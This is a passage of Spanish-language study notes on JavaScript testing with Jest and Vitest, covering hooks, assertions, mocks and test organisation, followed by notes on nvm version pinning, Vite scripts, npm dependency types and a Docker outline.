Inicializar recursos caros que pueden ser reutilizados, como crear una base de datos simulada o configurar un servidor de prueba

afterAll(fn):
Una vez después de que todos los test() de la Suite hayan finalizado
Suite (describe)
Tareas de limpieza pesadas, como apagar el servidor de prueba o cerrar la base de datos

beforeEach(fn):
Antes de cada test() individual dentro de la Suite.
Case (test)
Restablecer el estado de las variables, limpiar mocks o inicializar un componente de UI para que cada prueba comience desde cero

afterEach(fn):
Después de cada test() individual dentro de la Suite.
Case (test)
Limpiar mocks específicos o restaurar el estado global
(ej. restaurar la implementación de console.log).


##### Ej: Imagina que estás probando una clase Carrito y necesitas asegurarte de que cada prueba comienza con un carrito vacío:

```
// La clase de producción a probar
class Carrito {
    constructor() {
        this.items = [];
    }
    agregar(item) {
        this.items.push(item);
    }
    total() {
        return this.items.length;
    }
}

describe('Funcionalidad del Carrito de Compras', () => {
    let carrito; // Variable que queremos inicializar antes de cada prueba

    // HOOK beforeEach: Garantiza un estado limpio para cada test
    beforeEach(() => {
        // Ejecutado antes del Test 1, antes del Test 2, etc.
        carrito = new Carrito(); 
        console.log("-> Carrito reiniciado."); 
    });

    test('El carrito debe estar vacío al inicio', () => {
        expect(carrito.total()).toBe(0); // Pasa porque beforeEach lo vació
    });

    test('debe agregar un artículo correctamente', () => {
        carrito.agregar('manzana');
        expect(carrito.total()).toBe(1); // Este test se ejecuta con un carrito vacío, gracias al beforeEach
    });
    
    // El Test 3 también se ejecutará con un carrito vacío.
    test('no debe afectar a otras pruebas', () => {
        expect(carrito.items).toEqual([]);
    });

});
```


Hooks en Estructuras Anidadas:
##### Los hooks operan en el ámbito (scope) del describe() en el que están definidos
Si anidas describe(), los hooks del nivel superior se ejecutan para todos los niveles inferiores.

##### Si tienes un beforeEach en el describe externo, se ejecutará antes de cada prueba, incluso las que están en el describe anidado.

Esta característica te permite configurar un entorno general (con beforeAll externo)
Luego afinar el estado para subgrupos de pruebas con beforeEach en un describe anidado.





## 3. Pruebas de Integración (Integration Testing)

Verificar que diferentes partes de tu sistema funcionan correctamente juntas.

1. Definición y Propósito:
Probar la interacción entre dos o más unidades (ej. un controlador y un servicio, un componente y una tienda de estado).

### 2. Integración de Servicios (Back-End):
Probar endpoints de API utilizando herramientas como supertest para simular solicitudes HTTP (GET, POST, etc.) y verificar las respuestas.
Trabajar con una base de datos de pruebas separada.

### 3. Integración de Componentes (Front-End):
Probar cómo interactúan componentes hermanos o padre-hijo (ej. un formulario que pasa datos a un botón).
Simular el rendering y eventos del usuario.



## 4. Pruebas de Interfaz de Usuario y E2E (Front-End Testing)

Simular el comportamiento del usuario final y validar la experiencia completa de la aplicación.

### 1. Pruebas de Componentes (ej. con React Testing Library o Vue Test Utils):
Enfoque en las pruebas de comportamiento del usuario en lugar de los detalles internos del componente.
Uso de selectores accesibles (getByRole, getByText).
Disparo de eventos del usuario (fireEvent o userEvent).


### 2. Pruebas End-to-End (E2E):
Herramientas: Cypress o Playwright.
Simular un flujo completo del usuario en un navegador real o headless (ej. "Navegar a la página de inicio, iniciar sesión, agregar un artículo al carrito y finalizar la compra").
Configuración y fixtures (datos de prueba).



## 5. Técnicas Avanzadas y Métricas

Llevan tus prácticas de testing al siguiente nivel.

### 1. Cobertura de Código (Code Coverage):
Métricas: Cobertura de líneas, funciones y ramas.
Cómo generar informes de cobertura (Jest lo hace de forma nativa).
Establecer umbrales de cobertura obligatorios.



### 2. Test Driven Development (TDD):
El ciclo Rojo-Verde-Refactorizar (Escribir la prueba que falla → Escribir el código mínimo para que pase → Refactorizar).



### 3. Pruebas de Regresión y Pruebas de Humo:
Regresión: Asegurar que los cambios nuevos no rompieron la funcionalidad existente.
Humo: Un conjunto pequeño de pruebas de alta prioridad para asegurar que la aplicación más básica funciona.



## Recorrido

1. Configura Jest en un proyecto pequeño.
2. Escribe pruebas unitarias para una función pura, usando expect() y toBe().
3. Escribe pruebas unitarias para una función que depende de una API, usando Mocks para simular la respuesta de la API.
4. Añade una prueba de integración simple que verifique la comunicación entre dos módulos de tu código.
5. Si usas un framework de interfaz (React/Vue/Angular), integra RTL/Cypress/Playwright y escribe tu primera prueba E2E.


## Buenas prácticas Testing

Además de escribir pruebas, integrarlas eficientemente en el ciclo de desarrollo

1. Proporción
Seguir el modelo de la Pirámide de Pruebas

Amplia Base Unitaria: El grueso de tu suite de pruebas (alrededor del 70-80%) debe ser de Pruebas Unitarias
Son rápidas, baratas y proporcionan feedback instantáneo.

Capas Intermedias: Un porcentaje menor (alrededor del 10-20%) debe ser de Pruebas de Integración para verificar que los componentes
(servicios, bases de datos simuladas, APIs) trabajen juntos.

Cúspide Estratégica: La capa más pequeña (alrededor del 5-10%) debe ser de Pruebas End-to-End (E2E).
Resérvalas solo para los flujos de usuario más críticos.


2. Enfoque y Aislamiento (Pruebas Unitarias)
Pruebas unitarias sean efectivas siguiendo estos principios:

Principio F.I.R.S.T.: Las pruebas deben ser:
Fast (Rápidas): Se ejecutan rápidamente para feedback constante.
Isolated (Aisladas): Cada prueba se ejecuta de forma independiente, sin depender de otras.
Repeatable (Repetibles): Producen el mismo resultado cada vez que se ejecutan.
Self-Validating (Autovalidables): Pasan o fallan por sí mismas, sin intervención humana.
Timely (Oportunas): Se escriben antes (o inmediatamente después) del código de producción.

Aislar Dependencias: Utiliza Mocks, Stubs y Spies para reemplazar recursos externos lentos o volátiles 
(red, bases de datos, APIs de terceros)
La prueba debe fallar por tu lógica, no por un fallo de red.

Probar la Intención: No pruebes la implementación interna (cómo se hacen las cosas),
sino el comportamiento y el resultado (qué hacen las cosas). 
Esto facilita la refactorización.


3. Organización y Legibilidad
Una prueba bien escrita es tan importante como un buen código de producción.

##### Estructura AAA: Organiza la lógica de cada Test Case en tres secciones claras:
Arrange (Preparar): Configurar el entorno y los datos de entrada.
Act (Actuar): Ejecutar el código que se está probando.
Assert (Aserción): Verificar el resultado esperado

##### describe() Claro: Utiliza Test Suites (describe()) para agrupar pruebas por componente, clase o módulo
utiliza nombres que proporcionen contexto.

##### Nombres Expresivos: El nombre de la prueba (test()/it()) debe ser una oración completa que describa el comportamiento esperado, por ejemplo:
test('debe lanzar un error si el usuario no tiene permisos').

##### Hooks para Configuración: Utiliza Funciones de Hook (beforeEach, afterAll, etc.)
para gestionar la configuración y limpieza del entorno, manteniendo el código de prueba limpio y enfocado.


4. Integración Continua (CI) y Cobertura
Las pruebas deben ser una parte automática y obligatoria del proceso de desarrollo.

Automatización con CI: Configura tu sistema de Integración Continua (CI) (ej. GitHub Actions, Jenkins)
para que ejecute automáticamente toda tu suite de pruebas en cada push o pull request.

"No Merge en Rojo": Nunca permitas que se fusione (merge) código nuevo en la rama principal si las pruebas automatizadas fallan.

Monitorear la Cobertura: Monitorea la Cobertura de Código para identificar áreas de tu código que no están siendo probadas
Sin embargo, no uses la cobertura como una métrica de calidad absoluta; un 100% de cobertura de líneas no garantiza que tu lógica sea correcta.
Enfócate en la cobertura de rutas críticas y lógicas de negocio.


5. Manejo de Errores (Prueba los Fallos) 
##### Las mejores pruebas confirman que el sistema funciona bajo condiciones ideales y que maneja los fallos correctamente.

#### Probar Casos Borde (Edge Cases): Incluye pruebas para entradas extremas, límites (mínimo/máximo), entradas nulas/vacías y formatos inesperados.

#### Probar el Manejo de Excepciones: Asegúrate de que tu código lanza los errores correctos (expect().toThrow())
cuando algo sale mal y que puede recuperarse o mostrar el error de forma controlada.

#### Comprobar la Inmutabilidad: En pruebas donde se realizan cambios (ej. añadir un elemento a una lista)
verifica que solo se haya modificado lo que se supone que debe modificarse
y que las entradas originales permanezcan inmutables si esa es la intención.



### Unit Test
Maximizar su eficiencia, velocidad y fiabilidad. 
Al ser la base de la Pirámide de Pruebas, deben ser robustas y fáciles de mantener.

1. F.I.R.S.T.

Fast (Rápidas): Las pruebas deben ejecutarse en milisegundos
Si las pruebas unitarias son lentas, los desarrolladores evitan ejecutarlas, lo que rompe el ciclo de feedback rápido.

Isolated (Aisladas): Una prueba no debe depender del estado de otras pruebas
##### Utiliza Hooks (beforeEach) para resetear el entorno y Mocks para aislar dependencias.

Repeatable (Repetibles): La prueba debe producir el mismo resultado cada vez que se ejecuta
##### Evita dependencias externas no controladas (fechas, números aleatorios, llamadas a red).

Self-Validating (Autovalidables): La prueba debe pasar o fallar por sí misma, sin requerir una inspección manual de la salida.

Timely (Oportunas): Escribe las pruebas antes o inmediatamente después de escribir el código de producción
Esto ayuda a diseñar el código de manera que sea testeable.


2. Aislamiento y Control de Dependencias

Aspecto más crítico del Unit Testing para garantizar que solo se pruebe la unidad en cuestión.

##### Mockear el Mundo Exterior: Reemplaza todas las dependencias externas con Mocks o Stubs
Llamadas HTTP (fetch, axios).
Bases de Datos (ej. MongoDB, SQL).
Sistema de Archivos (I/O).
Funciones globales que no controlas (ej. setTimeout, Date).

##### Evitar Dependencias de Clase: Si la Unidad A depende de la Unidad B, simula la Unidad B si su lógica es compleja o su inicialización es costosa. Solo prueba la lógica de la Unidad A.

Evitar el console.log en el Código de Prueba: Los logs hacen que las pruebas sean difíciles de leer.
Si necesitas depurar, usa un debugger o un spy de testing.


3. Estructura y Legibilidad
Una prueba debe ser fácil de leer para que cualquiera

Sintaxis AAA (Arrange, Act, Assert): Estructura el cuerpo de tu test() de forma clara:
Arrange (Preparar): Declara variables, mocks y configura el estado inicial.
Act (Actuar): Ejecuta la unidad de código que estás probando.
Assert (Aserción): Usa Matchers (expect().toBe(), .toEqual()) para verificar el resultado.

Nombres Descriptivos: Los nombres del test() deben ser frases completas que describan el comportamiento esperado y la condición bajo la cual se prueba.
Malo: test('prueba suma')
Bueno: test('debe devolver la suma correcta de dos números positivos')

##### describe() Lógico: Agrupa las pruebas relacionadas con un módulo o componente específico.
##### Usa anidamiento (nested describe) para probar diferentes contextos o estados 
(ej. "Cuando el usuario no tiene permisos...").


4. Cobertura y Enfoque

##### Probar Rutas de Ejecución: Asegúrate de que las pruebas unitarias cubran el caminos felices (happy path)
también los caminos infelices (error handling).

Probar Casos Borde (Edge Cases): Incluye valores que están en los límites de tu lógica
(ej. el número 0, el string vacío "", el valor máximo permitido, fechas de inicio y fin).

Probar Comportamiento, No Implementación: No pruebes cómo funciona tu código internamente
(ej. mocks que comprueban llamadas a funciones privadas).
Prueba la interfaz pública y el resultado (el valor devuelto o el estado modificado).


5. Manejo de Errores

##### Probar Fallos con toThrow(): Asegúrate de que si tu función debe lanzar un error bajo ciertas condiciones
(ej. argumento inválido), la prueba verifica que ese error es lanzado correctamente, usando expect(() => func()).toThrow().

##### Probar Promesas con .rejects: Para funciones asíncronas, verifica que las Promesas se rechazan correctamente para manejar fallos de API o timeouts usando await expect(asyncFunc()).rejects.toThrow().



### Assertions
Definen qué significa que tu código sea "correcto".
Aplicar buenas prácticas al usar expect() y Matchers te garantiza pruebas fiables, legibles y fáciles de depurar.

1. Principio de Aserción Única (Ideal)
Aunque no siempre es estrictamente posible o deseable
la práctica ideal es que cada Test Case (test()) tenga un propósito único y se centre en una sola aserción.

Propósito Único: El nombre de la prueba debe describir lo que estás probando (ej. "debe calcular el 10% de descuento").
##### Fácil de Depurar: Si la prueba falla, sabes exactamente qué comportamiento falló, sin tener que revisar múltiples aserciones.

Malo (Múltiples Propósitos/Aserciones Complejas en un Solo Test):

```
test('debe devolver un usuario y tener las propiedades correctas', () => {
    const usuario = crearUsuario(datos);
    expect(usuario.id).toBeDefined(); // Aserción 1
    expect(usuario.nombre).toBe('Juan'); // Aserción 2
    expect(usuario.activo).toBeTruthy(); // Aserción 3
});
```

Mejor: 

```
test('debe asignar una ID al crear un usuario', () => {
    expect(crearUsuario(datos).id).toBeDefined();
});
test('el campo nombre debe coincidir con el input', () => {
    expect(crearUsuario(datos).nombre).toBe('Juan');
});
```


2. Matcher Correcto
Crucial para evitar errores comunes (especialmente el uso incorrecto de .toBe).

Valores Primitivos: Usa .toBe() solo para números, cadenas, booleanos, null y undefined. Comprueba la igualdad estricta (===).

Objetos y Arrays: Usa .toEqual() (o su alias .toStrictEqual()) para comparar la estructura interna (igualdad profunda) de objetos y arrays
Nunca uses .toBe() para estos tipos, ya que fallará debido a la diferencia de referencias en memoria.

Números Decimales: Usa .toBeCloseTo() para comparar números de punto flotante
Esto evita fallos debido a las imprecisiones nativas de la aritmética de JavaScript.

```
test('la división debe ser cercana a 0.33', () => {
    expect(1 / 3).toBeCloseTo(0.333333, 6); // 6 decimales de precisión
});
```


3. Aserciones Legibles y Expresivas
##### La prueba debe ser legible como una frase. Utiliza los matchers que expresen de mejor manera tu intención.

Preferir Matchers Explícitos: En lugar de usar .toBe(null) o .toBe(undefined)
utiliza los matchers específicos que son más claros

Genérico:
expect(valor).toBe(null)
expect(valor).toBe(undefined)
expect(valor).toBe(true)

Específico:
expect(valor).toBeNull()
expect(valor).toBeUndefined()
expect(valor).toBeTruthy() (si cualquier valor truthy es aceptable)


##### Encadenar Matchers para la Claridad Asíncrona: Asegúrate de usar .resolves y .rejects para manejar las Promesas correctamente

```
CLARO: Intención es esperar resolución y luego comparar.
await expect(llamadaAPI()).resolves.toEqual({ estado: 'ok' });
```

```
MENOS CLARO: Requiere más código para el mismo propósito.
const resultado = await llamadaAPI(); 
expect(resultado).toEqual({ estado: 'ok' });
```


4. Probar la Falta de Aserción y Errores
##### Las aserciones no solo deben verificar el éxito, sino también la existencia de fallos.

Aserción Cero: Si una prueba no contiene ninguna aserción (expect()), Jest asumirá que la prueba pasó
Utiliza expect.assertions(count) o expect.hasAssertions() para obligar a la prueba a ejecutar un número mínimo de aserciones.
Esto es vital cuando pruebas código asíncrono.

Probar Errores (Excepciones): Cuando pruebas el manejo de errores síncronos, asegúrate de que la aserción esté anidada correctamente

```
test('debe lanzar un error con mensaje de permisos', () => {
    // La función debe estar envuelta en una función para que toThrow la capture
    expect(() => funcionConPermisos()).toThrow('Permisos denegados');
});
```

not con Precisión: Utiliza el modificador .not para verificar que un valor no cumple con una condición
Por ejemplo, si un array de filtros no debe contener un ID específico.

```
expect(arrayDeIds).not.toContain(99);
```


### Estructura Test Suite / Test Case 

1. Organización de Archivos
Colocar los archivos de prueba directamente junto al archivo del componente que están probando.

src/components/Boton/Boton.jsx

src/components/Boton/Boton.test.jsx
Las pruebas unitarias y de integración para ese componente.


Alternativa: Carpetas `__tests__`
Una práctica menos común hoy en día (pero aún usada, especialmente si usas Jest por defecto, que las busca automáticamente)

src/components/Boton/index.jsx

`src/components/Boton/__tests__/Boton.test.jsx`
Las pruebas unitarias.

La primera opción (Boton.test.jsx junto al componente) es preferida porque facilita la navegación y la visibilidad.


2. Estructura Lógica de la Suite de Pruebas (Jest)

Dentro del archivo Boton.test.jsx
usamos describe() para la Test Suite
test() para los Test Cases
##### La clave es usar el anidamiento de describe() para probar diferentes estados o interacciones del componente.


Suite Principal: El Componente
El describe() más externo debe nombrar el componente o la unidad que estás probando.

```
// src/components/Boton/Boton.test.jsx

// Suite Principal
describe('Componente Boton', () => {
    // Aquí van los tests generales y los hooks
    // ...
});
```


Hooks: Configuración de Componentes
##### Utiliza beforeEach para inicializar variables o limpiar la pantalla después de cada prueba
Esto es común en React para asegurar que el DOM simulado esté limpio.

```
describe('Componente Boton', () => {
    // Asegura que el estado del componente no se filtre entre pruebas
    afterEach(() => {
        // Limpia el DOM simulado (si usas React Testing Library, por ejemplo)
        cleanup(); 
    });
    // ...
});
```

Test Cases Básicos (Rutas Felices):
Los primeros test() prueban el rendering básico y las propiedades (props) esenciales.

```
describe('Componente Boton', () => {
    // ... hooks ...

    // Caso de Prueba 1: Verifica que se renderiza
    test('debe renderizarse sin errores', () => {
        // Act: Renderizamos el componente (ej. con RTL)
        render(<Boton />);
        // Assert: Comprobamos que el elemento existe
        const boton = screen.getByRole('button');
        expect(boton).toBeInTheDocument(); 
    });

    // Caso de Prueba 2: Verifica que el texto se pasa por props
    test('debe mostrar el texto pasado por la prop "label"', () => {
        render(<Boton label="Hacer Click" />);
        // Assert: Comprobamos que el texto 'Hacer Click' está en el documento
        expect(screen.getByText('Hacer Click')).toBeInTheDocument();
    });
});
```


Anidamiento: Pruebas de Interacción y Contexto
Utiliza describe anidados para probar comportamientos específicos o contextos
como la interacción del usuario o la respuesta a diferentes props.

```
describe('Componente Boton', () => {
    // ... tests básicos ...

    describe('Al interactuar con el botón', () => { // <--- Suite Anidada (Contexto)
        const mockFn = jest.fn();

        test('debe llamar a la función onClick al ser clickeado', async () => {
            render(<Boton onClick={mockFn} />);
            const boton = screen.getByRole('button');
            
            // Act: Simular un evento de click (ej. con fireEvent o userEvent)
            await userEvent.click(boton); 
            
            // Assert: Verificar que el mock fue llamado
            expect(mockFn).toHaveBeenCalledTimes(1);
        });
    });

    describe('Cuando está deshabilitado', () => { // <--- Otro Contexto
        test('no debe reaccionar al click', async () => {
            const mockFn = jest.fn();
            render(<Boton onClick={mockFn} disabled />);

            await userEvent.click(screen.getByRole('button')); 

            // Assert: El mock no debe haber sido llamado
            expect(mockFn).not.toHaveBeenCalled();
        });
    });
});
```


Ej: 

La organización más recomendada refleja la estructura del código de producción
utilizando la convención de nomenclatura 
`[NombreComponente].test.jsx o [NombreComponente].spec.jsx`.

```
src/
├── components/
│   ├── Boton/
│   │   ├── Boton.jsx              <-- Código del Componente (Unidad a probar)
│   │   └── Boton.test.jsx         <-- Test Suite para Boton (Pruebas Unitarias)
│   │
│   ├── Header/
│   │   ├── Header.jsx             <-- Código del Componente
│   │   └── Header.test.jsx        <-- Test Suite para Header
│   │
│   └── FormularioLogin/
│       ├── FormularioLogin.jsx    <-- Código del Componente
│       └── FormularioLogin.test.jsx <-- Test Suite (incluye mocks de API, interacciones)
│
└── utils/
    ├── helpers.js                 <-- Función de utilidad (Unidad a probar)
    └── helpers.test.js            <-- Test Suite (Pruebas Unitarias Síncronas)
```


Estructura Lógica:
.test.jsx

Dentro de cada archivo de prueba (ej. Boton.test.jsx)
##### los Test Suites (describe) anidados se usan para organizar y dar contexto a los Test Cases (test).

```
// Contenido de Boton.test.jsx

// 1. TEST SUITE PRINCIPAL (Describe el componente)
describe('Componente Boton de UI', () => {

    // HOOK: Se ejecuta antes de CADA Test Case para aislar el estado.
    beforeEach(() => {
        // Limpieza del DOM simulado
    });

    // 2. TEST CASE BÁSICO (Verificación de renderizado)
    test('debe renderizarse sin errores y mostrar el texto por defecto', () => {
        // ASERCIONES (expect())
    });

    // 3. TEST SUITE ANIDADO (Contexto: Interacción de usuario)
    describe('Cuando el usuario hace click', () => {
        const mockFn = jest.fn();
        
        // 4. TEST CASE ESPECÍFICO
        test('debe llamar a la función onClick una sola vez', async () => {
            // ASERCIONES
            expect(mockFn).toHaveBeenCalledTimes(1); 
        });
    });

    // 5. TEST SUITE ANIDADO (Contexto: Estado deshabilitado)
    describe('Cuando la prop disabled es true', () => {
        
        // 6. TEST CASE DE RUTA INFELIZ (Error Handling)
        test('no debe llamar a la función onClick al ser clickeado', () => {
            // ASERCIONES
        });
    });
});
```



### SRP en Testing
Práctica fundamental que se aplica a todos los niveles del testing
Especialmente en el diseño de Pruebas Unitarias y en el uso de Mocks.

##### Una Prueba Unitaria (Test Case) o una Test Suite (describe) debe tener una sola razón para fallar.
Cada prueba debe enfocarse en verificar un solo comportamiento, una sola lógica o un solo resultado.

1. SRP en Pruebas Unitarias: Test Case 

Un Foco por Test Case:
Práctica: Limita cada Test Case a una única aserción (expect().toBe()) o a un único propósito verificable.

Beneficio: Si la prueba falla, sabes inmediatamente qué lógica se rompió. 
Si tienes 10 aserciones en un solo test(), y la tercera falla, el reporte no es claro.

Ejemplo: En lugar de probar que la función calcularTotal() aplica descuentos y maneja impuestos en una sola prueba, divídelo:

```
test('debe calcular el total sin impuestos')
test('debe aplicar un 10% de impuesto a la venta')
test('debe lanzar un error si el input es negativo')
```


SRP en la Test Suite (describe):

##### Práctica: Un bloque describe() debe enfocarse en una sola unidad de código (una clase, una función principal, un componente React).

Beneficio: Mantiene la organización. Si pruebas la función de Usuario y la función de Cálculo en la misma suite, rompes el aislamiento y confundes el propósito del archivo.


2. Aplicación del SRP en Mocks
##### Vital al diseñar tus Mocks porque su única responsabilidad es simular el comportamiento de la dependencia para la prueba actual.

##### Responsabilidad del Mock: Un Mock debe imitar solo la parte de la dependencia que es relevante para la unidad que se está probando
No debería tener que simular toda la funcionalidad de una clase compleja si solo necesitas un método.

Aislamiento: Al aplicar el SRP, aseguras que el Mock solo tiene una responsabilidad
devolver el dato simulado o el error simulado que necesitas para probar tu función.

Ejemplo: Si tu función obtenerDatos() llama a un servicio de API que tiene 10 métodos
##### tu mock solo necesita reemplazar el método obtenerUsuario(id) y devolver el JSON esperado.

Sin SRP: Un mock complejo que requiere inicializar 10 métodos y propiedades, la mayoría de las cuales no son usadas por el test
Con SRP: Un mock simple (jest.fn().mockResolvedValue(data)) cuya única responsabilidad es devolver la promesa resuelta para ese test case.


3. Rs

Test Case (test):
Una sola aserción / Un solo comportamiento.
Alta localización de errores: Sabes de inmediato qué se rompió.

Test Suite (describe):
Una sola unidad de código (Clase/Módulo/Componente).
Organización y claridad: El archivo de prueba tiene un propósito claro.

Mock:
Una sola implementación simulada por test case.
Fácil mantenimiento: Los mocks son simples, solo devuelven lo que la prueba necesita.




### Integration

### E2E


### Rs

#### test/it (test case, unidad), describe (test suite: agrupa test/it, todo entidad/módulo/componente)

#### Assertions (except()), Matchers

#### Mock (test case/test suite)




# NVM

cmmand -v nvm

nvm ls-remote

nvm instal --lts

nvm use --lts


npm create vite@latest


cd mi-proyecto-react


npm install


npm run dev

...
npm init


## .nvmrc y git: node local

garantiza que todos los desarrolladores y entornos de despliegue utilicen exactamente la misma versión de Node

Archivo .nvmrc:
En la raíz crear el archivo, comienza con .

Especificar la versión de Node:
en el archivo, introducir la versión exacta

1. Usar la versión actual (recomendado):
Si ya estás usando una versión específica (por ejemplo, 18.18.2) y quieres que el proyecto use esa, puedes obtener la versión con:

```
node -v > .nvmrc
```
en -v se pone v18.18.2 por ej.


2. Escribir la versión manualmente:

`lts/gallium`

O una versión específica: `18.18.2`

Asegúrate de que el archivo .nvmrc esté incluido en tu sistema de control de versiones (como Git) para que todos los colaboradores lo reciban.


Versión Local con nvm:
Una vez que el archivo .nvmrc existe en la raíz de tu proyecto, cualquiera puede navegar a la carpeta e introducir el siguiente comando:

```
nvm use
```

nvm busca el archivo .nvmrc en el directorio actual.
Lee la versión especificada (ej: 18.18.2).
Si la versión no está instalada, te preguntará si quieres instalarla.
Cambia la versión de Node.js que está activa en tu terminal solo para esa sesión, asegurando que el proyecto se ejecute con la versión correcta.

Esto establece efectivamente a Node.js como una "dependencia local" en términos de ambiente de ejecución.


Script node y nvm:
script para que la versión de Node se cargue automáticamente
Para una configuración de desarrollo robusta.

Aprovechar una característica del shell (como Bash o Zsh) y complementarlo con los scripts de package.json.
nvm exec y package.json

modificar el script de inicio de tu proyecto en package.json
para que siempre use la versión definida en el .nvmrc cuando ejecutes npm run dev.

1. Modificar el Archivo package.json
En "scripts" del package
Modifica el comando dev (o cualquier otro comando de inicio) para usar nvm exec

Antes:

```
"scripts": {
  "dev": "vite",
  "build": "vite build",
  "lint": "eslint . --ext js,jsx --report-unused-disable-directives --max-warnings 0",
  "preview": "vite preview"
},
```

Con nvm exec:

```
"scripts": {
  "dev": "nvm exec npm run _dev_internal",
  "build": "nvm exec npm run _build_internal",
  "lint": "nvm exec npm run _lint_internal",
  
  "_dev_internal": "vite",
  "_build_internal": "vite build",
  "_lint_internal": "eslint . --ext js,jsx --report-unused-disable-directives --max-warnings 0",

  "preview": "vite preview"
},
```

"dev": `"nvm exec npm run _dev_internal"`: 
Cuando ejecutas npm run dev, primero se ejecuta nvm exec.

nvm exec: Este comando lee la versión de Node.js del archivo .nvmrc
ejecuta el comando que le sigue `npm run _dev_internal`
usando esa versión específica de Node.js.

"_dev_internal": "vite":
comando original de Vite ha sido movido a un script "interno"
usando el prefijo '_' para indicar que no está diseñado para ser llamado directamente

cuando cualquier desarrollador ejecute npm run dev o npm run build
nvm se asegurará automáticamente de que la versión de Node.js sea la correcta
sin que el desarrollador tenga que escribir nvm use manualmente.


Alternativa Avanzada: Configuración del Shell (para uso general)
nvm use automatico cada vez que entras a la carpeta de tu proyecto en la terminal
requiere una configuración en tu archivo de inicio del shell (como .bashrc, .zshrc, o .profile).

1. Agregar la función al archivo de configuración del shell 
archivo de configuración (~/.zshrc o ~/.bashrc) y agrega esta función al final:

```
# Función para usar la versión de Node.js definida en .nvmrc automáticamente
cd() {
    builtin cd "$@"
    if [ -f .nvmrc ]; then
        nvm use > /dev/null 2>&1
    fi
}
```

2. Reiniciar el Shell
Guarda el archivo y aplica los cambios (o abre una nueva terminal):

```
source ~/.zshrc  # O la ruta de tu archivo
```

cada vez que uses el comando cd para entrar al directorio de tu proyecto
automáticamente se ejecutará nvm use y cargará la versión de Node.js especificada en el .nvmrc.



# Scripts Vite

1. Desarrollo y Build
comandos esenciales para la mayoría de los proyectos

"start":	
npm run dev
Alias para iniciar el servidor de desarrollo

dev":
vite
Inicia el servidor de desarrollo en modo hot module replacement (HMR). 
¡Muy rápido!

"build":	
vite build
Compila y empaqueta la aplicación para producción, generando los archivos optimizados en la carpeta dist.

"preview":
vite preview
Sirve la carpeta dist localmente para una prueba rápida de producción antes del despliegue
No es para uso en producción.


2. Calidad de Código (Linting y Formato)
mantener la consistencia y detectar errores tempranamente

"lint":
eslint . --ext js,jsx,ts,tsx
Ejecuta ESLint para revisar el código JS/TS/JSX/TSX en el directorio actual en busca de errores y problemas de estilo.

"lint:fix":
eslint . --ext js,jsx,ts,tsx --fix
Mismo que lint, pero intenta corregir automáticamente los problemas de estilo que puede solucionar.

"format":
prettier --write "src/**/*.{js,jsx,ts,tsx,json,css,md}"
Ejecuta Prettier para formatear y reescribir (limpiar) archivos de código, JSON, CSS y Markdown.


3. Testing
Con Vitest podemos definir:

"test":
vitest
Ejecuta las pruebas unitarias y de integración en modo watch (observación), por defecto.

"test:run":
vitest run
Ejecuta todas las pruebas una sola vez y sale (ideal para CI/CD).

"test:coverage":
vitest run --coverage
Ejecuta las pruebas y genera un informe de cobertura de código.


4. Pre-deploy: pre-deploy
útil para asegurar la calidad antes de realizar el build final

"prebuild":
npm run lint && npm run test:run
No necesita ser ejecutado directamente
NPM lo ejecuta automáticamente antes del script "build".
Garantiza que el código pasa el linting y las pruebas antes de compilarlo.

```
"scripts": {
  "start": "npm run dev",
  "dev": "vite",
  "build": "vite build",
  "preview": "vite preview",
  
  "lint": "eslint . --ext js,jsx,ts,tsx",
  "lint:fix": "eslint . --ext js,jsx,ts,tsx --fix",
  "format": "prettier --write \"src/**/*.{js,jsx,ts,tsx,json,css,md}\"",

  "test": "vitest",
  "test:run": "vitest run",
  "test:coverage": "vitest run --coverage",

  "prebuild": "npm run lint && npm run test:run" 
}
```


# Dev Dep, prod

Prod:
parte del bundle final

React Core: react, react-dom

Routing: react-router-dom

Gestión de Estado: Librerías para manejar el estado complejo a nivel global.
redux, zustand, recoil

Llamadas a API:
Clientes HTTP para realizar peticiones a backends.
axios, fetch (si se usa un polyfill), react-query / tanstack-query

UI/Estilos:
styled-components, emotion, material-ui (MUI), bootstrap

Ej: json

```
"dependencies": {
  "react": "^18.2.0",
  "react-dom": "^18.2.0",
  "react-router-dom": "^6.20.0",
  "axios": "^1.6.2",
  "styled-components": "^6.1.1"
}
```

dev dep:
construir, probar o mejorar la calidad del código de la aplicación
no requeridas en el entorno de ejecución
Cuando se crea el paquete final para producción (npm run build), estas dependencias se ignoran.

Build Tool:
Herramienta que compila, transpila y minifica el código (ej. de JSX/TS a JS).
vite, webpack, rollup

Transpilador/Lenguaje:
Convierte código moderno (ES6+, TypeScript) a un formato compatible con navegadores antiguos.
@babel/core, @babel/preset-react, typescript

Linters y Formatters:
Mantienen la calidad del código, detectan errores y aplican estilos consistentes.
eslint, prettier

Testing:
Frameworks y utilidades para ejecutar pruebas unitarias, de integración y end-to-end.
jest, @testing-library/react, cypress, vitest

Utilidades CLI:
Scripts de ayuda, como hot-reloading o servidor de desarrollo.
nodemon, concurrently

```
"devDependencies": {
  "@types/react": "^18.2.37",
  "@types/react-dom": "^18.2.15",
  "@vitejs/plugin-react": "^4.2.0",
  "eslint": "^8.53.0",
  "prettier": "^3.1.0",
  "vite": "^5.0.0",
  "jest": "^29.7.0"
}
```

Cuando se instala el proyecto en el servidor de producción o en un entorno de CI/CD para el build final
se suele ejecutar npm install --production
o npm install si se usa package-lock.json y el entorno lo soporta
Esto solo descarga las dependencias de producción.




# Docker

Tecnología de DevOps


## 1. Fundamentos y Uso Local

Docker, Contenedores, Imágenes, Dockerfile, Comandos CLI.

Diferencia entre una máquina virtual y un contenedor

Manejar los comandos básicos.


Esenciales:

1. Contenedores vs. Máquinas Virtuales (VM):
Los contenedores son más ligeros y rápidos (aislamiento a nivel del SO, no de hardware).

2. Imágenes (Images): 
Plantillas inmutables y la base de los contenedores.

3. Contenedores (Containers):
tancias ejecutables de una imagen.

4. Docker Engine:
Arquitectura de Docker (Cliente, Servidor/Daemon, Registros).


CLI y Flujo de Trabajo:

1. Instalación: Docker Desktop o Docker Engine

2. Gestión de Imágenes: 
docker pull: Descargar imágenes.
docker images: Listar imágenes.
docker rmi: Eliminar imágenes.

3. Gestión de Contenedores:
docker run: Crear y ejecutar un contenedor a partir de una imagen.
docker ps: Listar contenedores en ejecución.
docker stop, docker start, docker restart, docker rm.
docker exec: Ejecutar un comando dentro de un contenedor en ejecución (ej: entrar con bash).
docker logs: Ver la salida de un contenedor.


Creación de Imágenes con Dockerfile:

1. Sintaxis Dockerfile
2. Instrucciones clave: FROM, RUN, CMD, ENTRYPOINT, WORKDIR.
3. Construir la imagen: docker build.
4. Publicar la imagen: docker tag y docker push a Docker Hub.



## 2. Entornos

